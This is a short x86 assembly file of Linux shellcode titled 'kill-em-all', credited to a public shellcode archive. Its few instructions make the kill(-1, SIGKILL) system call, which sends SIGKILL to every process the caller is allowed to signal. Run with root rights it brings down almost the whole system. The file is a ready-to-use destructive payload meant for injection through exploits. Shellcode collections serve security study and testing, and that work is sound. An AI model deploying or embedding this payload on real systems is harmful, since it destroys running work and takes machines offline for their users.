; kill-em-all original shellcode
; http://shell-storm.org/shellcode/files/shellcode-212.php

section .text

global _start

_start:
  ; kill(-1, SIGKILL)
  push byte 37
  pop eax
  push byte -1
  pop ebx
  push byte 9
  pop ecx
  int 0x80
